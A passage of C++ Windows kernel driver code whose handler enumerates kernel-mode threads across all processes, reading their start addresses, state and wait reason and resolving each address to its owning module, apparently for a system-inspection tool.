	}

	auto response = (EnumAllKernelThreadsResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, requiredSize);
	response->Count = 0;

	// Get offsets
	ULONG win32StartOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.Win32StartAddressOffset : 0x620;
	ULONG stateOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.StateOffset : 0x184;
	ULONG waitReasonOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.WaitReasonOffset : 0x185;

	// Initialize AuxKlib for module resolution
	if (!NT_SUCCESS(AuxKlibInitialize()))
	{
		KdPrint((DRIVER_PREFIX "AuxKlibInitialize failed\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Get module list once for all threads
	PAUX_MODULE_EXTENDED_INFO modules = nullptr;
	ULONG moduleSize = 0;
	ULONG moduleCount = 0;
	
	if (NT_SUCCESS(AuxKlibQueryModuleInformation(&moduleSize, sizeof(AUX_MODULE_EXTENDED_INFO), nullptr)) && moduleSize > 0)
	{
		modules = (PAUX_MODULE_EXTENDED_INFO)ExAllocatePoolWithTag(NonPagedPool, moduleSize, 'modK');
		if (modules && NT_SUCCESS(AuxKlibQueryModuleInformation(&moduleSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules)))
		{
			moduleCount = moduleSize / sizeof(AUX_MODULE_EXTENDED_INFO);
		}
	}

	__try
	{
		// Query system process information
		ULONG bufferSize = 0x200000; // 2MB for all processes
		PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'thrK');
		if (!buffer)
		{
			if (modules) ExFreePoolWithTag(modules, 'modK');
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		NTSTATUS status = ZwQuerySystemInformation(LOCAL_SystemProcessInformation, buffer, bufferSize, nullptr);
		if (!NT_SUCCESS(status))
		{
			ExFreePoolWithTag(buffer, 'thrK');
			if (modules) ExFreePoolWithTag(modules, 'modK');
			return status;
		}

		// Iterate through all processes
		PSYSTEM_PROCESS_INFORMATION_LOCAL procInfo = (PSYSTEM_PROCESS_INFORMATION_LOCAL)buffer;
		while (procInfo && response->Count < MAX_KERNEL_THREADS)
		{
			ULONG pid = (ULONG)(ULONG_PTR)procInfo->UniqueProcessId;
			PSYSTEM_THREAD_INFORMATION_LOCAL threadInfo = procInfo->Threads;

			for (ULONG i = 0; i < procInfo->NumberOfThreads && response->Count < MAX_KERNEL_THREADS; i++)
			{
				ULONG64 startAddr = (ULONG64)threadInfo[i].StartAddress;
				
				// Check if this is a kernel-mode address (high bit set on x64)
				if (startAddr >= 0xFFFF800000000000ULL)
				{
					ULONG tid = (ULONG)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;
					
					KernelThreadInfo* entry = &response->Threads[response->Count];
					entry->ProcessId = pid;
					entry->ThreadId = tid;
					entry->StartAddress = startAddr;
					entry->State = (UCHAR)threadInfo[i].ThreadState;
					entry->WaitReason = (UCHAR)threadInfo[i].WaitReason;

					// Try to get Win32StartAddress from ETHREAD
					PETHREAD thread = nullptr;
					if (NT_SUCCESS(PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid, &thread)))
					{
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + win32StartOffset)))
						{
							entry->Win32StartAddress = *(PULONG64)((PUCHAR)thread + win32StartOffset);
						}
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + stateOffset)))
						{
							entry->State = *(PUCHAR)((PUCHAR)thread + stateOffset);
						}
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + waitReasonOffset)))
						{
							entry->WaitReason = *(PUCHAR)((PUCHAR)thread + waitReasonOffset);
						}
						ObDereferenceObject(thread);
					}

					// Resolve module name
					ULONG64 addr = entry->Win32StartAddress ? entry->Win32StartAddress : entry->StartAddress;
					if (addr && modules)
					{
						for (ULONG m = 0; m < moduleCount; m++)
						{
							ULONG64 base = (ULONG64)modules[m].BasicInfo.ImageBase;
							ULONG64 end = base + modules[m].ImageSize;
							if (addr >= base && addr < end)
							{
								entry->ModuleBase = base;
								entry->ModuleOffset = addr - base;
								PCHAR fileName = (PCHAR)modules[m].FullPathName + modules[m].FileNameOffset;
								size_t len = strlen(fileName);
								if (len >= MAX_MODULE_NAME_LENGTH) len = MAX_MODULE_NAME_LENGTH - 1;
								RtlCopyMemory(entry->ModuleName, fileName, len);
								entry->ModuleName[len] = '\0';
								break;
							}
						}
					}

					response->Count++;
				}
			}

			if (procInfo->NextEntryOffset == 0)
				break;
			procInfo = (PSYSTEM_PROCESS_INFORMATION_LOCAL)((PUCHAR)procInfo + procInfo->NextEntryOffset);
		}

		ExFreePoolWithTag(buffer, 'thrK');
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (modules) ExFreePoolWithTag(modules, 'modK');
		return STATUS_ACCESS_VIOLATION;
	}

	if (modules) ExFreePoolWithTag(modules, 'modK');
	*info = sizeof(EnumAllKernelThreadsResponse) + (response->Count > 0 ? (response->Count - 1) * sizeof(KernelThreadInfo) : 0);
	
	KdPrint((DRIVER_PREFIX "Enumerated %d kernel threads from all processes\n", response->Count));
	return STATUS_SUCCESS;
}
